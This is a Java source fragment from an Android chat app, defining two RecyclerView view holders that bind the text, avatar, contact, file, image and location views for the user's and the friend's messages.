class ItemMessageUserHolder extends RecyclerView.ViewHolder {
    public TextView txtContent;
    public CircleImageView avata;

    public LinearLayout chatcontact, chatfile;
    public ImageView contactdownlode, filedownlode, imgContent;
    public TextView cnameContent, cnumContent, fileContent, locContent;

    public ItemMessageUserHolder(View itemView) {
        super(itemView);
        txtContent = (TextView) itemView.findViewById(R.id.textContentUser);
        avata = (CircleImageView) itemView.findViewById(R.id.imageView2);

        chatcontact = (LinearLayout) itemView.findViewById(R.id.chatcontactuser);
        chatfile = (LinearLayout) itemView.findViewById(R.id.chatfileuser);
        contactdownlode = (ImageView) itemView.findViewById(R.id.contactdownlodeuser);
        filedownlode = (ImageView) itemView.findViewById(R.id.filedownlodeuser);
        imgContent = (ImageView) itemView.findViewById(R.id.imgContentUser);
        cnameContent = (TextView) itemView.findViewById(R.id.cnameContentUser);
        cnumContent = (TextView) itemView.findViewById(R.id.cnumContentUser);
        fileContent = (TextView) itemView.findViewById(R.id.fileContentUser);
        locContent = (TextView) itemView.findViewById(R.id.locContentuser);

    }
}

class ItemMessageFriendHolder extends RecyclerView.ViewHolder {
    public TextView txtContent;
    public CircleImageView avata;

    public LinearLayout chatcontact, chatfile;
    public ImageView contactdownlode, filedownlode, imgContent;
    public TextView cnameContent, cnumContent, fileContent, locContent;

    public ItemMessageFriendHolder(View itemView) {
        super(itemView);
        txtContent = (TextView) itemView.findViewById(R.id.textContentFriend);
        avata = (CircleImageView) itemView.findViewById(R.id.imageView3);

        chatcontact = (LinearLayout) itemView.findViewById(R.id.chatcontactfriend);
        chatfile = (LinearLayout) itemView.findViewById(R.id.chatfilefriend);
        contactdownlode = (ImageView) itemView.findViewById(R.id.contactdownlodefriend);
        filedownlode = (ImageView) itemView.findViewById(R.id.filedownlodefriend);
        imgContent = (ImageView) itemView.findViewById(R.id.imgContentFriend);
        cnameContent = (TextView) itemView.findViewById(R.id.cnameContentFriend);
        cnumContent = (TextView) itemView.findViewById(R.id.cnumContentFriend);
        fileContent = (TextView) itemView.findViewById(R.id.fileContentFriend);
        locContent = (TextView) itemView.findViewById(R.id.locContentFriend);
    }

}
